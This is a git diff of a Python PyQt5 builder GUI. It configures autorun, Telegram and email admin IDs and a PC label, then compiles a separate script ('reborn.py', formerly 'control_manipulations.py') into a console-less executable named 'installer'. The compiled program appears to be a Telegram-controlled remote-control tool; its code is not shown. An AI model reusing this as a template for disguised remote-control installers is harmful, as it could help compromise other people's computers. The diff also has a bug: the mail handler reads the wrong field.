@@ -1,21 +1,25 @@
-# pyuic5 visual_ui.ui -o visual_ui.py
-# pyinstaller --onefile --noconsole visual.py
+# <==========================================> #
+# <================= VISUAL =================> #
+# pyuic5 visual_ui1.ui -o visual_ui_.py        #
+# <==========================================> #
+# <================= COMPILE ================> #
+
+# pip3 install -r requirments.txt
+# pyinstaller --onefile visual.py -n installer --icon=Asset.ico --noconsole
+
+# <==========================================> #
+
 
 import sys
 from PyQt5.QtWidgets import QApplication, QWidget, QMainWindow, QFileDialog, QListWidgetItem
-from PyQt5 import uic, QtCore
-from PyQt5.QtGui import QPixmap, QImage, QBrush, QColor
-
-from visual_ui_ import Ui_MainWindow
 import subprocess
 
-import logging
-logging.basicConfig(filename='app.log', filemode='a', format='%(name)s - %(levelname)s - %(message)s')
-
+from visual_ui_ import Ui_MainWindow
 from private import ProgramName
+from utils import logging
 
 
-InstallFile = 'control_manipulations.py'
+# InstallFile = 'control_manipulations.py'
 InstallFile = 'reborn.py'
 
 
@@ -25,7 +29,9 @@ dict_ = {'AUTORUN': False,
          'LOGGING': False,
          'userID': [],
          'PC_info': '"PC_1"',
-         'PATH': 'r"E:\Coil64"'
+         'PATH': 'None',
+         'telegram_admins': [436264579, 673135047],
+         'email_admins': []
          }
 
 
@@ -53,12 +59,15 @@ class Install:
         self.window = window
         self.ui.install_button.clicked.connect(self.__install)
 
+    # Если нет модулей, нужно подключить явно!!!
     def __install(self):
         rewrite_private()
-        # pyinstaller --onefile control_manipulations.py --distpath test -n test
         try:
-            subprocess.call(f'pyinstaller --onefile --noconsole {InstallFile} '
-                            f'--distpath {dict_["PATH"]} -n {ProgramName}')
+            #  --noconsole
+            subprocess.call('pip3 install -r requirments.txt')
+            subprocess.call(f'pyinstaller --onefile {InstallFile} '
+                            f'--distpath {dict_["PATH"]} -n {ProgramName} --icon=Asset.ico ' +
+                            '--hidden-import python-telegram-bot')
 
         except:
             logging.error("Exception occurred", exc_info=True)
@@ -90,10 +99,12 @@ class OtherParams:
         self.window = window
         self.ui.pcInfo_text.editingFinished.connect(self.edit_pc_INFO)
         self.ui.custumerId_text.editingFinished.connect(self.edit_custumerId)
+        # self.ui.autorun_box.liveness_box.connect()
         self.ui.autorun_box.stateChanged.connect(self.check_boxes)
         self.ui.tg_box.stateChanged.connect(self.check_boxes)
         self.ui.mail_box.stateChanged.connect(self.check_boxes)
-        self.ui.log_box.stateChanged.connect(self.check_boxes)
+        self.ui.tg_text.editingFinished.connect(self.edit_tg_text)
+        self.ui.mail_text.editingFinished.connect(self.edit_mail_text)
 
     def edit_pc_INFO(self):
         dict_['PC_info'] = f'"{self.ui.pcInfo_text.text()}"'
@@ -101,11 +112,19 @@ class OtherParams:
     def edit_custumerId(self):
         dict_['userID'] = [str(self.ui.custumerId_text.text())]
 
+    def edit_tg_text(self):
+        if str(self.ui.tg_text.text()):
+            dict_['telegram_admins'] = str(self.ui.tg_text.text())
+
+    def edit_mail_text(self):
+        if f'"{self.ui.pcInfo_text.text()}"':
+            dict_['email_admins'] = f'"{self.ui.pcInfo_text.text()}"'
+
+
     def check_boxes(self):
         dict_['AUTORUN'] = True if self.ui.autorun_box.checkState() > 0 else False
         dict_['TG'] = True if self.ui.tg_box.checkState() > 0 else False
         dict_['MAIL'] = True if self.ui.mail_box.checkState() > 0 else False
-        dict_['LOGGING'] = True if self.ui.log_box.checkState() > 0 else False
 
 
 class mywindow(QMainWindow):
